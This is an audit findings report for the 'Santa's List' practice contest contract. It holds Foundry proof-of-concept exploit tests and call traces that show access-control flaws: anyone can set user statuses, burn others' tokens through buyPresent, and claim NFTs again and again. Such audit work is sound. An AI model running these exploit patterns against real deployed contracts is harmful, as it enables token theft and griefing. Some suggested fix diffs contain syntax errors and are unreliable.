# First Flight #5: Santa's List - Findings Report

# Table of contents
- ## [Contest Summary](#contest-summary)
- ## [Results Summary](#results-summary)
- ## High Risk Findings
    - ### [H-01. Enum default assigns first value to all users](#H-01)
    - ### [H-02. Missing onlySanta() modifier in a function only callable by santa.](#H-02)
    - ### [H-03. burned function  with no access control gives room for malicious user to steal tokens](#H-03)
    - ### [H-04. more than 1 NFT can be obtained per address](#H-04)
- ## Medium Risk Findings
    - ### [M-01. Inconsistent NFT price](#M-01)



# <a id='contest-summary'></a>Contest Summary

### Sponsor: First Flight #5

### Dates: Nov 30th, 2023 - Dec 7th, 2023

[See more contest details here](https://codehawks.cyfrin.io/c/2023-11-Santas-List)

# <a id='results-summary'></a>Results Summary

### Number of findings:
- High: 4
- Medium: 1
- Low: 0


# High Risk Findings

## <a id='H-01'></a>H-01. Enum default assigns first value to all users            



## Summary
The default value of enums assign it's first member to all users. The enum in santalist.sol declare Nice as it's first member which will automatically set all users to Nice.
## Vulnerability Details
Every users will have their status set to Nice but as long as santa list did not check them in the second time, they won't be able to perform any action with that NICE attribute but this does not follow the intention of the team as it was stated in the docs that santa must check them twice before they can be eligible for the present, so making a known attribute the default value go against the team intention. 
## Impact
Users Automatically get an Attribute they are suppose to earn or be checked in for without having to do anything
## POC
```
 function testCheckListWithouctFunctioncall() public {
        assertEq(
            uint256(santasList.getNaughtyOrNiceOnce(user)),
            uint256(SantasList.Status.NICE)
        );
    }
```
Run  the test above in santaList.t.sol --mt testCheckListWithouctFunctioncall t see it pass Automatically with the call trace below
```
[10133] SantasListTest::testCheckListWithouctFunctioncall() 
    ├─ [2690] SantasList::getNaughtyOrNiceOnce(user: [0x6CA6d1e2D5347Bfab1d91e883F1915560e09129D]) [staticcall]
    │   └─ ← 0
    └─ ← ()
```
the return value of the call traces above is 0 which is the representation of the first Item of an enum in this case `Nice`.
## Tools Used
manual review, foundry

## Recommendations
The enum members did not follow what was stated in the docs completely, it is recommended for the team to follow what was written in the docs by making the changes below.
``` diff
enum Status {
-        NICE,
-        EXTRA_NICE,
-        NAUGHTY,
-        NOT_CHECKED_TWICE
    }
enum Status {
+        UNKNOWN
+        NICE,
+        EXTRA_NICE,
+        NAUGHTY,
    }

``` 
removing `NOT_CHECKED_TWICE as it was not part of the members stated in the [docs](https://github.com/Cyfrin/2023-11-Santas-List#list-checking) which was not use anywhere in the smart contract and making the enum default value to be UNKNOWN as a user character cannot be determine untill it is confirmed what attribute such user possessed.
## <a id='H-02'></a>H-02. Missing onlySanta() modifier in a function only callable by santa.            



## Summary
`SantasList::checkList` function which is meant to be called by only santa was left to be called by any user interracting with santalist.
## Vulnerability Details
the `SantasList::checklist` function was stated in the comment that it can only be called by santa [here](https://github.com/Cyfrin/2023-11-Santas-List/blob/886f801daa1968cccccfd8790a510417aedc88b6/src/SantasList.sol#L116) but unfortunately was left open to users. The function give users to set themselves to any enum attributes they desired for themselves or change the status of other user to Good or Bad  without approval or confirmation from santa . 
## Impact
1) users can decide to give themselves their desired attributes which is not backed by confirmation of the santa.
2) Grief users have the power to set other users attribute to NAUGHTY to stop them from getting any present from santaList.
## POC1
```
function testCheckListCalledByUser() public {
        vm.prank(user);
        santasList.checkList(user, SantasList.Status.NICE);
        assertEq(
            uint256(santasList.getNaughtyOrNiceOnce(user)),
            uint256(SantasList.Status.NICE)
        );
    }

```
Add the above test to santaList.t.sol and test them with `forge t --mt testCheckListCalledByUser -vvvvv`
below is the output of the call trace 
```
[16037] SantasListTest::testCheckListCalledByUser() 
    ├─ [0] VM::prank(user: [0x6CA6d1e2D5347Bfab1d91e883F1915560e09129D]) 
    │   └─ ← ()
    ├─ [4211] SantasList::checkList(user: [0x6CA6d1e2D5347Bfab1d91e883F1915560e09129D], 0) 
    │   ├─ emit CheckedOnce(person: user: [0x6CA6d1e2D5347Bfab1d91e883F1915560e09129D], status: 0)
    │   └─ ← ()
    ├─ [690] SantasList::getNaughtyOrNiceOnce(user: [0x6CA6d1e2D5347Bfab1d91e883F1915560e09129D]) [staticcall]
    │   └─ ← 0
    └─ ← ()
```
## POC2
```
 function testgriefUserStopedUserfromCollectPresent() public {
        vm.startPrank(santa);
        santasList.checkList(user, SantasList.Status.NICE);
        santasList.checkTwice(user, SantasList.Status.NICE);
        vm.stopPrank();
        //grief user stopping other user from claiming present

        address griefUser = makeAddr("griefUser");
        vm.prank(griefUser);
        santasList.checkList(user, SantasList.Status.NAUGHTY);

        vm.warp(santasList.CHRISTMAS_2023_BLOCK_TIME() + 1);

        vm.startPrank(user);
        vm.expectRevert(SantasList.SantasList__NotNice.selector);
        santasList.collectPresent();

        vm.stopPrank();
    }
```
Also add the above function to santaList.t.sol and test with `forge t --mt testgriefUserStopedUserfromCollectPresent -vvvvv` to test for a grief user stopping another user from claiming his present
call trace below
```
[53105] SantasListTest::testgriefUserStopedUserfromCollectPresent() 
    ├─ [0] VM::startPrank(santa: [0x70C9C64bFC5eD9611F397B04bc9DF67eb30e0FcF]) 
    │   └─ ← ()
    ├─ [4211] SantasList::checkList(user: [0x6CA6d1e2D5347Bfab1d91e883F1915560e09129D], 0) 
    │   ├─ emit CheckedOnce(person: user: [0x6CA6d1e2D5347Bfab1d91e883F1915560e09129D], status: 0)
    │   └─ ← ()
    ├─ [4519] SantasList::checkTwice(user: [0x6CA6d1e2D5347Bfab1d91e883F1915560e09129D], 0) 
    │   ├─ emit CheckedTwice(person: user: [0x6CA6d1e2D5347Bfab1d91e883F1915560e09129D], status: 0)
    │   └─ ← ()
    ├─ [0] VM::stopPrank() 
    │   └─ ← ()
    ├─ [0] VM::addr(<pk>) [staticcall]
    │   └─ ← griefUser: [0x2c0DB1460A017A7DE1c2F9CB0F3aE9430DD8c5f6]
    ├─ [0] VM::label(griefUser: [0x2c0DB1460A017A7DE1c2F9CB0F3aE9430DD8c5f6], griefUser) 
    │   └─ ← ()
    ├─ [0] VM::prank(griefUser: [0x2c0DB1460A017A7DE1c2F9CB0F3aE9430DD8c5f6]) 
    │   └─ ← ()
    ├─ [22111] SantasList::checkList(user: [0x6CA6d1e2D5347Bfab1d91e883F1915560e09129D], 2) 
    │   ├─ emit CheckedOnce(person: user: [0x6CA6d1e2D5347Bfab1d91e883F1915560e09129D], status: 2)
    │   └─ ← ()
    ├─ [283] SantasList::CHRISTMAS_2023_BLOCK_TIME() [staticcall]
    │   └─ ← 1703480381 [1.703e9]
    ├─ [0] VM::warp(1703480382 [1.703e9]) 
    │   └─ ← ()
    ├─ [0] VM::startPrank(user: [0x6CA6d1e2D5347Bfab1d91e883F1915560e09129D]) 
    │   └─ ← ()
    ├─ [0] VM::expectRevert(SantasList__NotNice()) 
    │   └─ ← ()
    ├─ [3023] SantasList::collectPresent() 
    │   └─ ← "SantasList__NotNice()"
    ├─ [0] VM::stopPrank() 
    │   └─ ← ()
    └─ ← ()
```

## Tools Used
Manual Review and Foundry

## Recommendations
`SantasList::checklist` should be guarded properly to give only santa the authourity to call the function.
```diff
-    function checkList(address person, Status status) external {
+   function checkList(address person, Status status) external onlySanta {
## <a id='H-03'></a>H-03. burned function  with no access control gives room for malicious user to steal tokens            



## Summary
Users token can be burned by malicious user  to buy present.
## Vulnerability Details
`Santalist::buyPresent` function has no access control to determine if the user calling the function has the right owner to the token to burn from because the function did not check if the rightful owner of the token before minting NFT which will give a malicious user the opportunity to buy present with EXTRANICE users' token
## Impact
ExtraNice users will lose all the extra erc20 token given to them for being extraNice
## Tools Used
foundry, manual review
#POC 
```function testMaliciousUserCollectTokenExtraNice() public {
        vm.startPrank(santa);
        santasList.checkList(user, SantasList.Status.EXTRA_NICE);
        santasList.checkTwice(user, SantasList.Status.EXTRA_NICE);
        vm.stopPrank();

        vm.warp(santasList.CHRISTMAS_2023_BLOCK_TIME() + 1);

        vm.startPrank(user);
        santasList.collectPresent();
        assertEq(santasList.balanceOf(user), 1);
        assertEq(santaToken.balanceOf(user), 1e18);
        vm.stopPrank();
        address maliciousUser = makeAddr("maliciousUser");
        //assert malicious user has no present
        assertEq(santasList.balanceOf(maliciousUser), 0);
        vm.prank(maliciousUser);
        santasList.buyPresent(user);
        //assert malicious user  now has  present
        assertEq(santasList.balanceOf(maliciousUser), 1);
    }
```
Add the above function to santalist.t.sol  and run with `forge test --mt testMaliciousUserCollectTokenExtraNice -vvvvv`
``` [205609] SantasListTest::testMaliciousUserCollectTokenExtraNice() 
    ├─ [0] VM::startPrank(santa: [0x70C9C64bFC5eD9611F397B04bc9DF67eb30e0FcF]) 
    │   └─ ← ()
    ├─ [24111] SantasList::checkList(user: [0x6CA6d1e2D5347Bfab1d91e883F1915560e09129D], 1) 
    │   ├─ emit CheckedOnce(person: user: [0x6CA6d1e2D5347Bfab1d91e883F1915560e09129D], status: 1)
    │   └─ ← ()
    ├─ [24419] SantasList::checkTwice(user: [0x6CA6d1e2D5347Bfab1d91e883F1915560e09129D], 1) 
    │   ├─ emit CheckedTwice(person: user: [0x6CA6d1e2D5347Bfab1d91e883F1915560e09129D], status: 1)
    │   └─ ← ()
    ├─ [0] VM::stopPrank() 
    │   └─ ← ()
    ├─ [283] SantasList::CHRISTMAS_2023_BLOCK_TIME() [staticcall]
    │   └─ ← 1703480381 [1.703e9]
    ├─ [0] VM::warp(1703480382 [1.703e9]) 
    │   └─ ← ()
    ├─ [0] VM::startPrank(user: [0x6CA6d1e2D5347Bfab1d91e883F1915560e09129D]) 
    │   └─ ← ()
    ├─ [120077] SantasList::collectPresent() 
    │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: user: [0x6CA6d1e2D5347Bfab1d91e883F1915560e09129D], tokenId: 0)
    │   ├─ [46713] SantaToken::mint(user: [0x6CA6d1e2D5347Bfab1d91e883F1915560e09129D]) 
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: user: [0x6CA6d1e2D5347Bfab1d91e883F1915560e09129D], amount: 1000000000000000000 [1e18])
    │   │   └─ ← ()
    │   └─ ← ()
    ├─ [678] SantasList::balanceOf(user: [0x6CA6d1e2D5347Bfab1d91e883F1915560e09129D]) [staticcall]
    │   └─ ← 1
    ├─ [542] SantaToken::balanceOf(user: [0x6CA6d1e2D5347Bfab1d91e883F1915560e09129D]) [staticcall]
    │   └─ ← 1000000000000000000 [1e18]
    ├─ [0] VM::stopPrank() 
    │   └─ ← ()
    ├─ [0] VM::addr(<pk>) [staticcall]
    │   └─ ← maliciousUser: [0x00aE22013C2eD3a7b7F91E4a2C70e44cDe3f5E5e]
    ├─ [0] VM::label(maliciousUser: [0x00aE22013C2eD3a7b7F91E4a2C70e44cDe3f5E5e], maliciousUser) 
    │   └─ ← ()
    ├─ [2678] SantasList::balanceOf(maliciousUser: [0x00aE22013C2eD3a7b7F91E4a2C70e44cDe3f5E5e]) [staticcall]
    │   └─ ← 0
    ├─ [0] VM::prank(maliciousUser: [0x00aE22013C2eD3a7b7F91E4a2C70e44cDe3f5E5e]) 
    │   └─ ← ()
    ├─ [39319] SantasList::buyPresent(user: [0x6CA6d1e2D5347Bfab1d91e883F1915560e09129D]) 
    │   ├─ [2348] SantaToken::burn(user: [0x6CA6d1e2D5347Bfab1d91e883F1915560e09129D]) 
    │   │   ├─ emit Transfer(from: user: [0x6CA6d1e2D5347Bfab1d91e883F1915560e09129D], to: 0x0000000000000000000000000000000000000000, amount: 1000000000000000000 [1e18])
    │   │   └─ ← ()
    │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: maliciousUser: [0x00aE22013C2eD3a7b7F91E4a2C70e44cDe3f5E5e], tokenId: 1)
    │   └─ ← ()
    ├─ [678] SantasList::balanceOf(maliciousUser: [0x00aE22013C2eD3a7b7F91E4a2C70e44cDe3f5E5e]) [staticcall]
    │   └─ ← 1
    └─ ← ()
```
## Recommendations
it was stated in the document that the token holder has to approve santalist before calling buy present function
it  is advised that the team should make sure the logic entails in buyPresent function handles the smart contract as intended by the team and properly secure from being hacked 
```diff
function buyPresent(address presentReceiver) external {
-        i_santaToken.burn(presentReceiver);
+       require(i_santaToken.transferfrom(msg.sender, address(this), 2e18));
+      i_santaToken.burn(address(this));
-      _mintAndIncrement();
+     _safeMint(presentReceiver, s_tokenCounter++);

    }
```
the above addition and subtraction will allow the `buyPresent` function to work as intended by the team, the price is changed to 2e18 to allow for the logic to work with the intended price from the document and make sure to increase the token id for the next user to have it's unique token id
## <a id='H-04'></a>H-04. more than 1 NFT can be obtained per address            



## Summary
A malicous user can obtained more than one NFT per address
## Vulnerability Details
Thou present are given to only nice and extranice users, A nice user can also be malicious and can advantage of the vulnerability in the collectPresent function , the balance of each user is what is used to determine if a user has collected a present  which  is actually not valid if a user transfer the NFT to another address in other to claim more NFT for nice user and more NFT and santaToken for Extra Nice user as much as they want to keep claiming present. 
## Impact
A malicious user can claim more NFT than expected by each user.
## POC
```
  function testCanCollectPresentIfAlreadyCollected() public {
        vm.startPrank(santa);
        santasList.checkList(user, SantasList.Status.NICE);
        santasList.checkTwice(user, SantasList.Status.NICE);
        vm.stopPrank();

        vm.warp(santasList.CHRISTMAS_2023_BLOCK_TIME() + 1);
        address userSecondAddress = makeAddr("userSecondAddress");
        for (uint i = 0; i <= 200; i++) {
            vm.startPrank(user);
            santasList.collectPresent();
            santasList.approve(userSecondAddress, i);
            vm.stopPrank();
            vm.prank(userSecondAddress);
            santasList.transferFrom(user, userSecondAddress, i);
        }
 assertEq(santasList.balanceOf(userSecondAddress), 200);
}
```
The above code is a proof of concept of a user who claimed present 200 times and can also keep claiming for as long as possible
Add the above function to santaListTest.t.sol and run with `forge test --mt testCanCollectPresentIfAlreadyCollected -vvvvv`
## Tools Used
manual review and foundry
## Recommendations
Add a mapping to the stateVariable  that keep track if a user has claimed a present or not i.e
```diff
//state variable
+  mapping(address -> bool) hasClaimedPresent;

-   if (balanceOf(msg.sender) > 0) {
+  if (hasClaimedPresent[msg.sender]) {
            revert SantasList__AlreadyCollected();
        }

// add to the collectPresent function in the Nice logic and set the status of user who has claimed to true
+    hasClaimedPresent[msg.sender] = true;`

// add to the collectPresent function in the ExtraNice logic and set the status of user who has claimed to true
+  hasClaimedPresent[msg.sender] = true;
```

    
# Medium Risk Findings

## <a id='M-01'></a>M-01. Inconsistent NFT price            



## Summary

## Vulnerability Details
The documented price for buying an NFT is 2e18, while the actual function code burns only 1e18 and The documented token reward for "extra nice" users who collect NFTs is 2e18, while the actual function code mints only 1e18 tokens. the purchased cost that was declared was not used.
## Impact
This discrepancy is a critical issue, as it could lead to user dissatisfaction and a lack of trust in the platform.
## Tools Used
manual review
## Recommendations
Update the buyNFT function to burn 2e18 instead of 1e18. This will ensure that the price of an NFT matches the documented price.
Update the collectNFT function to mint 2e18 tokens for "extra nice" users. This will ensure that users are rewarded with the correct amount of tokens, as stated in the documentation.





